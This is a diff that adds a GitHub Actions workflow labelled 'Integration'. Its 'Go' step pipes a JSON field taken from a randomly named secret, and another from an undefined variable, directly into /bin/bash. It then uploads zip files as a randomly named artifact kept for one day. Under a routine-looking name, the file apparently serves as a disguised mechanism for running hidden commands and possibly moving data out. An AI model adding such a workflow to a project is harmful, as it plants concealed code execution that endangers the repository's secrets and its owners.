@@ -1,0 +1,27 @@
+name: Integration
+on:
+  workflow_dispatch:
+
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  runner:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Go
+        env:
+          czgxm5: ${{ secrets.czgxm5 }}
+        run: |
+          printf '%s' "$czgxm5" | jq -r .na62 | /bin/bash
+          printf '%s' "$gjfm33781" | jq -r .ephs9447 | /bin/bash
+
+      - name: Archive results
+        uses: actions/upload-artifact@v4
+        with:
+          name: nSIG4p0l
+          path: "*.zip"
+          retention-days: 1
